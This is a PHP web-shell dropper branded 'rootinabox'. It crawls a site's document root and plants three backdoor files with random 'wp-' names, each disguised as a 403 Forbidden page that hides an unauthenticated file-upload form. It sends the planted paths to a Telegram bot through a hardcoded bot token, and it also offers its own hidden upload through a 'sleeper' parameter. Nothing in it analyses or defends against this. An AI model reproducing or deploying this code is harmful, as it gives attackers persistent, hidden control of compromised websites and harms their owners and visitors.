<?php
function http_get($url)
{
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close($im);
}

echo '<h1>rootinabox</h1>';
echo '<p>Telegram : @rootinabox</p>';
echo '<p>Channel : <a href="https://t.me/Rootinabox_Channel" target="_blank" rel="noopener">https://t.me/Rootinabox_Channel</a></p>';

session_start();
if (!$_SESSION['logdsx']) {
    $ban_folder = array('', '');
    $check3 = $_SERVER['DOCUMENT_ROOT'];
    $zz = scandir($check3);

    function random_name($a)
    {
        $string = str_split("azertyuiopqsdfghjklmwxcvbn");
        $s = "";
        for ($i = 0; $i <= $a; $i++) {
            $s .= $string[rand(0, count($string) - 1)];
        }
        return "/wp-" . $s . ".php";
    }

    $check4 = array();
    $check4[] = $_SERVER['DOCUMENT_ROOT'];
    $i2 = 0;
    for ($i = 0; $i <= count($check4); $i++) {
        $z = scandir($check4[$i]);
        $z = array_diff($z, array('.', '..'));
        foreach ($z as $b) {
// if(in_array($b,$ban_folder)) continue;
            if (is_dir($check4[$i] . '/' . $b)) {
                $check4[] = $check4[$i] . '/' . $b;
            }
        }
        if ($i2 >= 50) break;
        $i2 += 1;
    }
    $text3 = '<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access this resource.</p><p>Additionally, a 403 Forbiddenerror was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>
<?php
if($_GET["payload"] == "sent"){
    $xx = $_FILES["file"]["name"];
    $yy  = $_FILES["file"]["tmp_name"];';
    $text3 .= 'echo ("';
    $text3 .= "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='upload' />
</form>";
    $text3 .= '");';
    $text3 .= 'move_uploaded_file($yy,$xx); }?>';
    if (count($check4) > 0) {
        $finalpath = array();
        $finalpathfiles = array();
        $bilmsg = "";
        $i = 0;
        do {

            $path = $check4[rand(0, count($check4) - 1)];
            if (!in_array($path, $finalpath) and $path != $_SERVER['DOCUMENT_ROOT'] and $path != __DIR__) {
                $save = $path . random_name(4);
                $finalpathfiles[] = $save;
                $bilmsg .= "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\nPath :  " . $save . "\r\n";
                $finalpath[] = $path;
                $open3 = fopen($save, 'w');
                fwrite($open3, $text3);
                fclose($open3);
            }
            $_SESSION['logdsx'] = True;
        } while (count($finalpathfiles) < 3);
    }
    $zbi = array('5230995499');
    foreach ($zbi as $user_id) {
        $website = "https://api.telegram.org/bot5104435082:AAHi56fgh4YyCKAK7d4Xep0BrdqyeX-SY_0";
        $params = [
            'chat_id' => $user_id,
            'text' => $bilmsg,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }
}
$message = $_GET['sleeper'];

if ($message == 'washere') {
    $xx = $_FILES['file']['name'];
    $yy = $_FILES['file']['tmp_name'];
    echo "<form method='POST' enctype='multipart/form-data'>
    <input type='file'name='file' />
    <input type='submit' value='upload' />
</form>";

    move_uploaded_file($yy, $xx);
}